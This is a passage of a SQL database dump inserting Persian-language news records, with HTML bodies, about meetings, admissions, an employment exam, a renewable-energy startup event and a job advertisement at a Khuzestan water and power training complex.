	در این دیدار، مسئول نهاد رهبری با تأکید بر اهمیت توسعه آموزش&zwnj;های بین&zwnj;المللی در راستای ارتقاء کیفیت آموزشی و پژوهشی، به بررسی ظرفیت&zwnj;ها و امکانات موجود در مجتمع پرداخته و بر لزوم همکاری&zwnj;های بین&zwnj;المللی در این زمینه تأکید کرد<span dir="LTR">. </span></p>
<p dir="RTL" style="text-align: justify;">
	مدیران مجتمع نیز ضمن ارائه گزارشی از فعالیت&zwnj;ها و دستاوردهای خود، نظرات و پیشنهادات لازم را برای راه&zwnj;اندازی این مرکز مطرح کردند. این نشست فرصتی مناسب برای تبادل تجربیات و برنامه&zwnj;ریزی جهت توسعه آموزش&zwnj;های بین&zwnj;الملل در حوزه صنعت آب و برق بود<span dir="LTR">. </span></p>
<p>
	&nbsp;</p>
', '60262nahadrahbri.jpg', 87, '1403/10/20', '8:49:35 AM', 1403, 'دی', 10, '20');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60263, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'دیدار رئیس مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان با فرمانده حوزه مقاومت بسیج شهید عباسپور', '<p dir="RTL" style="text-align: justify;">
	در یک دیدار رسمی، دکتر هودگر، رئیس مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، با سرهنگ مسلم زهیری، فرمانده حوزه مقاومت بسیج شهید عباسپور، ملاقات کرد. در این جلسه، دکتر هودگر انتصاب سرهنگ زهیری به عنوان فرمانده حوزه را تبریک گفت و بر اهمیت همکاری&zwnj;های مشترک تاکید کرد<span dir="LTR">. </span></p>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="text-align: justify;">
	در یک دیدار رسمی، دکتر هودگر، رئیس مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، با سرهنگ مسلم زهیری، فرمانده حوزه مقاومت بسیج شهید عباسپور، ملاقات کرد. در این جلسه، دکتر هودگر انتصاب سرهنگ زهیری به عنوان فرمانده حوزه را تبریک گفت و بر اهمیت همکاری&zwnj;های مشترک تاکید کرد<span dir="LTR">. </span></p>
<p dir="RTL" style="text-align: justify;">
	این دیدار به منظور هم&zwnj;اندیشی و بررسی راهکارهای برگزاری دوره&zwnj;های توانمندسازی برای فرماندهان پایگاه&zwnj;های زیرمجموعه سازمان آب و برق خوزستان برگزار شد. طرفین در این جلسه بر لزوم ارتقاء سطح علمی و عملی فرماندهان تاکید کردند و به تبادل نظر در خصوص برنامه&zwnj;های آموزشی و پژوهشی آینده پرداختند<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	این اقدام به عنوان گامی مهم در جهت تقویت توانمندی&zwnj;ها و افزایش کارایی نیروهای فعال بسیجی در حوزه آب و برق استان خوزستان تلقی می&zwnj;شود<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>
', '60263basiij.jpg', 147, '1403/10/20', '8:56:45 AM', 1403, 'دی', 10, '20');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60264, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'جلسه همفکری مسئولین فرهنگی دانشگاه جامع علمی کاربردی استان خوزستان برگزار شد', '<p dir="RTL" style="text-align: justify;">
	در یک نشست همفکری که با حضور مسئولین فرهنگی دانشگاه جامع علمی کاربردی استان خوزستان برگزار شد، مسئول امور فرهنگی و دینی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان نیز به نمایندگی از این مجتمع حضور یافت</p>
<p style="text-align: justify;">
	&nbsp;</p>
', '<p dir="RTL" style="text-align: justify;">
	در یک نشست همفکری که با حضور مسئولین فرهنگی دانشگاه جامع علمی کاربردی استان خوزستان برگزار شد، مسئول امور فرهنگی و دینی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان نیز به نمایندگی از این مجتمع حضور یافت<span dir="LTR">. </span></p>
<p dir="RTL" style="text-align: justify;">
	این نشست با هدف تبادل نظر و بررسی راهکارهای ارتقاء فعالیت&zwnj;های فرهنگی و دینی در دانشگاه&zwnj;ها برگزار شد. مسئولین حاضر در این جلسه به بحث و بررسی چالش&zwnj;ها و فرصت&zwnj;های موجود در حوزه فرهنگ و دین پرداختند و بر لزوم همکاری&zwnj;های مشترک برای تقویت برنامه&zwnj;های فرهنگی تاکید کردند<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>
', '60264fahang.jpg', 113, '1403/10/20', '8:59:10 AM', 1403, 'دی', 10, '20');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60265, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', '‍ پذیرش دانشجو بدون آزمون', '<p>
	مرکز علمی کاربردی صنعت آب و برق خوزستان در بهمن ماه ۱۴۰۳ و در مقاطع تحصیلی کاردانی و کارشناسی، بدون آزمون دانشجو می پذیرد.</p>', '<p style="text-align: justify;">
	<span style="font-family: Vazirmatn; font-size: 16px; white-space-collapse: preserve;">آموزش های علمی کاربردی، کوتاه ترین، آسان ترین و کم هزینه ترین مسیر برای ورود به بازار کار</span></p>
<p style="text-align: justify;">
	<span style="font-family: Vazirmatn; font-size: 16px; white-space-collapse: preserve;">با انتخاب رشته های علمی کاربردی آینده شغلی خود را تضمین کنید.</span></p>
<p style="text-align: justify;">
	<span style="font-family: Vazirmatn; font-size: 16px; white-space-collapse: preserve;">مرکز علمی کاربردی صنعت آب و برق خوزستان در بهمن ماه ۱۴۰۳ و در مقاطع تحصیلی کاردانی و کارشناسی، بدون آزمون دانشجو می پذیرد.</span></p>
<p style="text-align: justify;">
	<span style="font-family: Vazirmatn; font-size: 16px; white-space-collapse: preserve;">از علاقه مندان دعوت می گردد جهت ثبت نام به سایت</span><span style="font-family: Vazirmatn; font-size: 16px; white-space-collapse: preserve;"> </span><a class="anchor-url" href="https://www.sanjesh.org/" rel="noopener noreferrer" style="box-sizing: inherit; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); display: inline-block; direction: ltr; font-family: Vazirmatn; font-size: 16px; white-space-collapse: preserve;" target="_blank">www.sanjesh.org</a><span style="font-family: Vazirmatn; font-size: 16px; white-space-collapse: preserve;"> </span><span style="font-family: Vazirmatn; font-size: 16px; white-space-collapse: preserve;">مراجعه نموده و یا بصورت حضوری ثبت نام خود را در مرکز آب و برق نهایی نمایند.</span></p>
<h1 style="text-align: justify;">
	<span style="color:#ff0000;"><span style="font-family: Vazirmatn; font-size: 16px; white-space-collapse: preserve;">زمان ثبت نام: یکم لغایت ششم بهمن ماه ۱۴۰۳</span></span></h1>
<h1 style="text-align: justify;">
	<span style="color:#ff0000;"><span style="font-family: Vazirmatn; font-size: 16px; white-space-collapse: preserve;">نشانی محل ثبت نام : مرکز علمی کاربردی صنعت آب و برق خوزستان واقع در اهواز؛اتوبان گلستان بین خیابان کاشان و همدان</span></span></h1>
<h1 style="text-align: justify;">
	<span style="color:#ff0000;"><span style="font-family: Vazirmatn; font-size: 16px; white-space-collapse: preserve;">شماره تماس : ۳۳۳۴۰۰۷۰-۰۶۱</span></span></h1>', '60265paziresh.jpg', 212, '1403/10/20', '10:02:50 AM', 1403, 'دی', 10, '20');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60266, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'برگزاری جلسه همکاری‌های مشترک بین موسسه چهارم خرداد و مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان', '<p style="text-align: justify;">
	&nbsp;در راستای تقویت همکاری&zwnj;های آموزشی و تربیتی، جلسه&zwnj;ای با حضور نمایندگان موسسه چهارم خرداد (روز ملی مقاومت) و مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار شد. این جلسه با هدف بررسی راهکارهای آموزش و تربیت کادر فنی برای روایتگری در اردوهای راهیان پیشرفت و راهیان نور تشکیل گردید.</p>', '<p style="text-align: justify;">
	&nbsp;در راستای تقویت همکاری&zwnj;های آموزشی و تربیتی، جلسه&zwnj;ای با حضور نمایندگان موسسه چهارم خرداد (روز ملی مقاومت) و مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار شد. این جلسه با هدف بررسی راهکارهای آموزش و تربیت کادر فنی برای روایتگری در اردوهای راهیان پیشرفت و راهیان نور تشکیل گردید.<br />
	&nbsp;در این جلسه، کارشناسان و متخصصان دو نهاد به تبادل نظر درباره اهمیت روایتگری در انتقال فرهنگ ایثار و مقاومت پرداختند و بر لزوم آماده&zwnj;سازی نیروهای متخصص برای اجرای هرچه بهتر این اردوها تأکید کردند. همچنین، برنامه&zwnj;های آموزشی و دوره&zwnj;های تخصصی برای تربیت راویان با هدف ارتقای کیفیت اردوهای یادشده مورد بحث و بررسی قرار گرفت.<br />
	&nbsp;موسسه چهارم خرداد و مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان بر این باورند که همکاری&zwnj;های مشترک می&zwnj;تواند به ترویج فرهنگ ایثار و شهادت کمک شایانی کند و در نهایت موجب آگاهی نسل جوان از ارزش&zwnj;های دفاع مقدس شود.</p>', '60266khordad.jpg', 114, '1403/10/26', '1:49:30 AM', 1403, 'دی', 10, '26');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60267, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'برگزاری جشن ولادت با سعادت حضرت علی علیه السلام و روز پدر در مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان', '<p>
	&nbsp;به گزارش روابط عمومی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، جشن ولادت با سعادت حضرت علی علیه السلام و روز پدر با حضور پرسنل و خانواده&zwnj;های محترم ایشان برگزار شد.</p>', '<p style="text-align: justify;">
	&nbsp;به گزارش روابط عمومی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، جشن ولادت با سعادت حضرت علی علیه السلام و روز پدر با حضور پرسنل و خانواده&zwnj;های محترم ایشان برگزار شد.</p>
<p style="text-align: justify;">
	&nbsp;این مراسم با قرائت قرآن کریم آغاز گردید و سپس دکتر هودگر، ریاست مجتمع، به میهمانان خوش&zwnj;آمد گفت. در ادامه، آیت الله سید ابوالحسن حسن زاده، نماینده محترم استان خوزستان در مجلس خبرگان رهبری، در خصوص فضایل امام علی علیه السلام و اهمیت روز پدر سخنرانی کرد.<br />
	<br />
	&nbsp;جشن ولادت حضرت علی (ع) با برنامه&zwnj;های شاد و مفرحی همراه بود که توسط جمعی از هنرمندان مطرح استان اجرا شد. این مراسم شامل بخش&zwnj;های متنوعی از جمله اجرای گروه تواشیح، پخش کلیپ و سرود، و ضیافت شام بود. همچنین برای کودکان حاضر در مراسم، برنامه&zwnj;ای جداگانه تحت عنوان &quot;ایستگاه شادمانه نوجوان&quot; برگزار شد که موجب شادی و نشاط آنها گردید.<br />
	<br />
	&nbsp;</p>', '60267jashn.jpg', 104, '1403/10/26', '1:53:46 AM', 1403, 'دی', 10, '26');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (61266, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'برگزاری جلسه شورای فرهنگی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان', '<p style="text-align: justify;">
	جلسه شورای فرهنگی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان با حضور ریاست و اعضای شورا برگزار شد.</p>', '<p style="text-align: justify;">
	جلسه شورای فرهنگی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان با حضور ریاست و اعضای شورا برگزار شد. در این جلسه، برنامه&zwnj;های فرهنگی اجرا شده در دی ماه گذشته ارزیابی و نقاط قوت و ضعف آن&zwnj;ها مورد بحث و بررسی قرار گرفت. همچنین، اعضای شورا به برنامه&zwnj;ریزی برای اجرای بهتر برنامه&zwnj;های فرهنگی در بهمن ماه پرداختند تا با ایجاد ابتکارات جدید، فضاهای فرهنگی مجتمع را غنی&zwnj;تر سازند.</p>
<p style="text-align: justify;">
	این جلسات به منظور ارتقاء سطح فعالیت&zwnj;های فرهنگی و آموزشی در مجتمع برگزار می&zwnj;شود و اعضا بر اهمیت همکاری و همفکری در این راستا تأکید کردند.</p>', '60268Untitledmm.jpg', 89, '1403/11/5', '10:50:45 AM', 1403, 'بهمن', 11, '5');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (61267, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'برگزاری یازدهمین جلسه روسای مراکز علمی کاربردی استان خوزستان', '<p style="text-align: justify;">
	یازدهمین جلسه روسای مراکز علمی کاربردی استان خوزستان به میزبانی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار شد. این جلسه با حضور دکتر بهرهی، ریاست دانشگاه جامع علمی کاربردی استان خوزستان، حجت الاسلام والمسلمین سمیع، مسئول نهاد رهبری دانشگاه جامع علمی کاربردی خوزستان، و دکتر مهدی هودگر، رئیس مرکز و مجتمع عالی آب و برق خوزستان تشکیل گردید.</p>
<p>
	&nbsp;</p>', '<p style="text-align: justify;">
	یازدهمین جلسه روسای مراکز علمی کاربردی استان خوزستان به میزبانی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار شد. این جلسه با حضور دکتر بهرهی، ریاست دانشگاه جامع علمی کاربردی استان خوزستان، حجت الاسلام والمسلمین سمیع، مسئول نهاد رهبری دانشگاه جامع علمی کاربردی خوزستان، و دکتر مهدی هودگر، رئیس مرکز و مجتمع عالی آب و برق خوزستان تشکیل گردید.</p>
<p style="text-align: justify;">
	هدف از برگزاری این جلسه، همفکری و ارتقای روابط بین مراکز علمی کاربردی استان بود. در این نشست، مدیران به تبادل نظرات و تجربیات خود پرداختند و راهکارهای لازم برای بهبود همکاری&zwnj;ها و ارتقای کیفیت آموزش در مراکز علمی کاربردی مورد بررسی قرار گرفت.</p>', '61267Untitleaad.jpg', 108, '1403/11/5', '3:49:33 PM', 1403, 'بهمن', 11, '5');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (61268, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'آزمون استخدامی شرکت های وابسته (غیر دولتی) زیر مجموعه شرکت مادر تخصصی تولید نیروی برق حرارتی برگزار شد', '<p>
	به گزارش روابط عمومی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان در روز پنجشنبه مورخ ۴ بهمن ماه ، آزمون استخدامی شرکت های وابسته (غیر دولتی) زیر مجموعه شرکت مادر تخصصی تولید نیروی برق حرارتی برگزار شد.</p>', '<p style="text-align: justify;">
	&nbsp; به گزارش روابط عمومی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان در روز پنجشنبه مورخ ۴ بهمن ماه ، آزمون استخدامی شرکت های وابسته (غیر دولتی) زیر مجموعه شرکت مادر تخصصی تولید نیروی برق حرارتی برگزار شد.</p>
<p style="text-align: justify;">
	آزمون مذکور از ساعت ۹:۰۰ صبح شروع و تا ساعت ۱۱:۳۰ ادامه یافت.</p>
<p style="text-align: justify;">
	مجری برگزاری این آزمون، اداره صلاحیت حرفه&zwnj;ای مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان بود. همچنین، نمایندگان دستگاه متقاضی ( نیروگاه های حرارتی کشور ) به عنوان ناظر آزمون در محل برگزاری حاضر شدند و پس از اتمام آزمون، مراتب رضایتمندی دستگاه متقاضی از اجرای آزمون اعلام گردید.</p>', '61268Unffftitled.jpg', 155, '1403/11/5', '3:51:53 PM', 1403, 'بهمن', 11, '5');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (61269, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'برگزاری جلسه هماهنگی دوره حامیم: توانمندسازی دانشجویان در حوزه‌های فرهنگی و اجتماعی', '<p style="text-align: justify;">
	به گزارش روابط عمومی مجتمع، جلسه&zwnj;ی هماهنگی برای دوره حامیم با حضور حجت الاسلام محمد علی سمیع، مسئول نهاد رهبری دانشگاه جامع علمی کاربردی خوزستان و مهندس محمد طاهر دباغ، مسئول امور فرهنگی مجتمع عالی آموزشی صنعت آب و برق خوزستان برگزار شد.</p>', '<p style="text-align: justify;">
	به گزارش روابط عمومی مجتمع، جلسه&zwnj;ی هماهنگی برای دوره حامیم با حضور حجت الاسلام محمد علی سمیع، مسئول نهاد رهبری دانشگاه جامع علمی کاربردی خوزستان و مهندس محمد طاهر دباغ، مسئول امور فرهنگی مجتمع عالی آموزشی صنعت آب و برق خوزستان برگزار شد.</p>
<p style="text-align: justify;">
	طرح حامیم که مخفف عبارت &laquo;حلقه&zwnj;های میانی&raquo; است، از سال ۱۴۰۱ به منظور توانمندسازی دانشجویان فعال در حوزه&zwnj;های مختلف معرفتی و مهارتی روز از جمله اندیشه اسلامی، انقلاب اسلامی، تاریخ، جریان&zwnj;شناسی دانشگاه امروز و تحولات جهان و همچنین پاسخ به شبهات طراحی شده است.</p>
<p style="text-align: justify;">
	از اهداف اصلی این طرح می&zwnj;توان به شبکه&zwnj;سازی دانشجویان مستعد، استفاده حداکثری از ظرفیت آن&zwnj;ها و تقویت نشاط و روحیه کار جمعی اشاره کرد. در این طرح، دانشجویان فعال و با انگیزه که دارای سابقه فعالیت&zwnj;های علمی، فرهنگی، سیاسی و رسانه&zwnj;ای هستند، شناسایی می&zwnj;شوند. پس از انجام مصاحبه حضوری، دانشجویان به نسبت تعداد دانشجویان هر استان به کل دانشجویان کشور برای مراحل دانشگاهی، استانی و کشوری گزینش می&zwnj;گردند.</p>
<p style="text-align: justify;">
	لازم به ذکر است میزبان دوره دانشجویی حامیم مراکز علمی کاربردی استان ، مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان می باشد .</p>', '61269Untitledaaa.jpg', 119, '1403/11/8', '9:28:55 PM', 1403, 'بهمن', 11, '8');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (61270, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'مهلت ثبت نام در مقطع كارداني و كارشناسي ناپیوسته بدون آزمون تا 13 بهمن ماه تمدید شد', '<p>
	به گزارش روابط عمومی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان ، مهلت ثبت نام و&zwnj; انتخاب رشته مقطع کاردانی و کارشناسی ناپیوسته، بدون آزمون (صرفا بر اساس سوابق تحصیلی) برای ترم بهمن تمدید شد.</p>', '<p style="text-align: justify;">
	به گزارش روابط عمومی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان ، مهلت ثبت نام و&zwnj; انتخاب رشته مقطع کاردانی و کارشناسی ناپیوسته، بدون آزمون (صرفا بر اساس سوابق تحصیلی) برای ترم بهمن تمدید شد. بر این اساس، ثبت نام و انتخاب رشته پذیرش بر اساس سوابق تحصیلی ، تا ۱۳ بهمن ماه تمدید شد. داوطلبان می&zwnj;توانند به منظور ثبت نام به سامانه <a class="anchor-url" href="https://Sanjesh.Org" rel="noopener noreferrer" target="_blank">Sanjesh.Org</a> مراجعه و بعد از مطالعه دفترچه راهنمای ثبت نام و کسب آگاهی، در صورت تمایل و داشتن شرایط با تهیه کارت اعتباری نسبت به ثبت نام و انتخاب رشته اقدام کنند.</p>', '61270phototamdid.jpg', 200, '1403/11/8', '9:36:10 PM', 1403, 'بهمن', 11, '8');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62269, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'جلسه بررسی عملکرد پایگاه بسیج مجتمع آموزشی صنعت آب و برق خوزستان و برنامه‌ریزی دوره تربیت فرماندهان', '<p dir="RTL" style="text-align: justify;">
	در جلسه&zwnj;ای که با حضور سرهنگ زهیری، فرمانده حوزه بسیج شهید عباسپور سازمان آب و برق خوزستان و دکتر مهدی هودگر، ریاست مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار شد، موضوعات مهمی مورد بحث و بررسی قرار گرفت<span dir="LTR">.</span></p>
', '<p dir="RTL" style="text-align: justify;">
	در جلسه&zwnj;ای که با حضور سرهنگ زهیری، فرمانده حوزه بسیج شهید عباسپور سازمان آب و برق خوزستان و دکتر مهدی هودگر، ریاست مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار شد، موضوعات مهمی مورد بحث و بررسی قرار گرفت<span dir="LTR">. </span></p>
<p dir="RTL" style="text-align: justify;">
	این جلسه به منظور ارزیابی عملکرد پایگاه بسیج مجتمع و همچنین برنامه&zwnj;ریزی برای دوره تربیت تعالی فرماندهان برگزار گردید. در این نشست، دکتر هودگر به تشریح فعالیت&zwnj;ها و دستاوردهای پایگاه بسیج پرداخت و بر اهمیت تقویت روحیه همکاری و هم&zwnj;افزایی میان اعضای بسیج تأکید کرد<span dir="LTR">. </span></p>
<p dir="RTL" style="text-align: justify;">
	سرهنگ زهیری نیز در این جلسه به ضرورت تربیت فرماندهان کارآمد و متعهد اشاره کرد و خواستار تدوین برنامه&zwnj;های آموزشی مؤثر برای ارتقاء سطح توانمندی&zwnj;های فرماندهان بسیج شد<span dir="LTR">.</span></p>
', '61271basij.jpg', 110, '1403/11/17', '9:54:29 AM', 1403, 'بهمن', 11, '17');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62270, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'جلسه بررسی عملکرد آموزشی و دوره های برگزار شده و تقویم سال آینده فنی مهندسی - تخصصی شرکت‌های بهره‌برداری و تعمیرات سد و نیروگاه ها در سال ۱۴۰۳', '<p dir="RTL" style="text-align: justify;">
	جلسه&zwnj;ای به منظور بررسی عملکرد آموزشی و دوره&zwnj;های فنی مهندسی و بهره برداری برگزار شده برای شرکت&zwnj;های شد و نیروگاه در سال ۱۴۰۳، با حضور مدیران و کارشناسان مرتبط در سالن جلسات گیت بوستان برگزار شد. در این جلسه، برنامه&zwnj;ریزی برای تقویم آموزشی سال ۱۴۰۴ نیز مورد بحث و بررسی قرار گرفت<span dir="LTR">.</span></p>
', '<p dir="RTL" style="text-align: justify;">
	جلسه&zwnj;ای با هدف بررسی عملکرد آموزشی و دوره&zwnj;های برگزار شده برای پرسنل فنی مهندسی و بهره برداری شش شرکت&zwnj; سد و نیروگاه در سال ۱۴۰۳، در روز دوشنبه مورخ ۱۴۰۳/۱۱/۱۵ در سالن جلسات گیت بوستان برگزار شد<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	این جلسه با حضور دکتر گرامی مقدم، مدیر بهره&zwnj;برداری سد و نیروگاه&zwnj;ها، دکتر عرب زاده معاونت برنامه&zwnj;ریزی آموزشی و مهندس ناصر نژاد رئیس گروه آموزشی برق، انرژی و نیروگاه، همچنین روسا و مدیران آموزشی به همراه معاونین فنی مهندسی و معاونی بهره&zwnj;برداری شش شرکت معاونت سد و نیروگاه تشکیل گردید<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	در این جلسه، گزارشی از عملکرد آموزشی سال ۱۴۰۳ ارائه شد و موضوعات مختلفی مورد بحث قرار گرفت. همچنین، به منظور برنامه&zwnj;ریزی برای تقویم آموزشی سال ۱۴۰۴، تصمیم گرفته شد که از هفته پیش رو کمیته&zwnj;ای تخصصی به تأیید دوره&zwnj;های مورد نیاز برای شش شرکت سد و نیروگاه&zwnj;ها تشکیل شود. این جلسات قرار است به صورت هفتگی برگزار گردد تا تقویم آموزشی به طور مؤثری بررسی٬ تولید و تنظیم شود<span dir="LTR">. </span></p>
<p dir="RTL" style="text-align: justify;">
	این اقدام نشان&zwnj;دهنده اهتمام جدی معاونت بخشی سد و نیروگاه و مدیریت شرکت&zwnj;ها به ارتقاء سطح دانش و مهارت&zwnj;های فنی پرسنل خود و همچنین بهبود کیفیت خدمات در حوزه سد و نیروگاه&zwnj;ها است<span dir="LTR">.</span></p>
', '62270jalase.jpg', 144, '1403/11/17', '10:01:56 AM', 1403, 'بهمن', 11, '17');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62271, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'اولین رویداد ملی استارتاپی فناوری‌های نوین در انرژی‌های تجدیدپذیر برگزار شد', '<p dir="RTL" style="text-align: justify;">
	رویداد استارتاپی با عنوان &quot;فناوری های نوین در انرژی های تجدیدپذیر&quot; در تاریخ 16 بهمن ماه در مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار شد. این رویداد با حضور داوران و حامیانی از پارک علم و فناوری خوزستان و بنیاد ملی نخبگان، به ارائه 14 طرح نوآورانه در زمینه انرژی&zwnj;های تجدیدپذیر پرداخت<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>', '<p dir="RTL" style="text-align: justify;">
	در تاریخ 16 بهمن ماه، مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان میزبان رویداد استارتاپی &quot;فناوری های نوین در انرژی های تجدیدپذیر&quot; بود. دکتر مهدی هوگر، رئیس رویداد، در ابتدای مراسم با خوش آمدگویی به حاضران، از داوران و عوامل برگزارکننده تشکر کرد و بر اهمیت گسترش و حمایت از چنین رویدادهایی تأکید کرد. او گفت: &quot;این گونه رویدادها نه تنها به شناسایی و پرورش ایده&zwnj;های نوآورانه کمک می&zwnj;کند، بلکه بستری مناسب برای تعامل میان نخبگان و صنعتگران فراهم می&zwnj;آورد. حمایت از ایده&zwnj;های جوانان و ارتقاء توانمندی&zwnj;های علمی و فنی در زمینه انرژی&zwnj;های تجدیدپذیر، از اهداف اصلی ماست<span dir="LTR">.&quot;</span></p>
<p dir="RTL" style="text-align: justify;">
	این رویداد مورد حمایت سازمان علمی پژوهشی بسیج خوزستان، پارک علم و فناوری خوزستان، بنیاد ملی نخبگان خوزستان&nbsp; و سازمان آب و برق خوزستان بود. داوران حاضر در این رویداد از پارک علم و فناوری، برق منطقه&zwnj;ای استان و شتابدهنده های فعال استان&nbsp; بودند، تا در صورت جذابیت طرح ها بتوان مورد حمایت قرار گیرد<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	از میان طرح&zwnj;های ارسال شده، 14 طرح موفق به پذیرش شدند که شامل 12 ایده در زمینه انرژی خورشیدی و 2 ایده در زمینه انرژی بادی بود. پس از ارائه تیم&zwnj;ها بصورت حضوری و مجازی ، طرح&zwnj;ها به بحث و داوری گذاشته شدند تا بهترین ایده&zwnj;ها شناسایی و مورد حمایت قرار گیرند<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	به نفرات برتر این رویداد جوایزی اهدا خواهد شد که شامل حمایت&zwnj;های مالی و همچنین امکان استقرار در مرکز رشد شهدای صنعت آب و برق خوزستان است. این مرکز با ارائه امکانات و منابع لازم، به استارتاپ&zwnj;ها کمک می&zwnj;کند تا ایده&zwnj;های خود را به مرحله اجرایی برسانند و در بازار رقابتی امروز جایگاه مناسبی پیدا کنند<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	با توجه به اهمیت روزافزون انرژی&zwnj;های تجدیدپذیر و نیاز به توسعه پایدار، این رویداد می&zwnj;تواند نقش بسزایی در رشد و پیشرفت این حوزه ایفا کند و به ایجاد یک اکوسیستم پویا برای استارتاپ&zwnj;ها در زمینه فناوری&zwnj;های نوین انرژی کمک نماید.</p>
<p>
	&nbsp;</p>', '62271Unt.jpg', 116, '1403/11/19', '11:56:15 PM', 1403, 'بهمن', 11, '19');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (62272, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'آگهي آزمون بکارگیری نیروی حجمي', '<p dir="RTL" style="text-align: justify;">
	به اطلاع ميرساند شرکت های پیمانکار طرف قرارداد شرکت توزیع نیروی برق استان ایلام به منظور تأمين نيروي انساني مورد نياز خود از بین افراد واجد شرایط دعوت به همکاری می نماید.</p>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="margin-right: 0.2pt; text-align: justify;">
	به اطلاع مي&shy;رساند شرکت های پیمانکار (سبزپوشان کارآفرین ، زیباکاران ایلام )طرف قرارداد شرکت توزیع نیروی برق استان کرمانشاه به منظور تأمين نيروي انساني مورد نياز، تعداد <span style="color:#000080;"><strong>30</strong></span> نفر (تعـداد: <span style="color:#000080;"><strong>2</strong></span> نفر به عنوان راننده خودرو سنگین &ndash; پایه یکم وجرثقال، <span style="color:#000080;"><strong>28</strong></span> نفر به عـنوان سیمبان) از آقايـان واجد شرايط را از طريق آزمون دانش مهارت (کتبی تخصصی و مصاحبه) و طی فرآیند گزینش و به ترتیب از بالاترین نمره با شرايط ذيل و در قالب قرارداد نیروی حجمی بکارگیری مي&shy;نمايند.</p>
<p dir="RTL" style="margin-right: 0.2pt; text-align: center;">
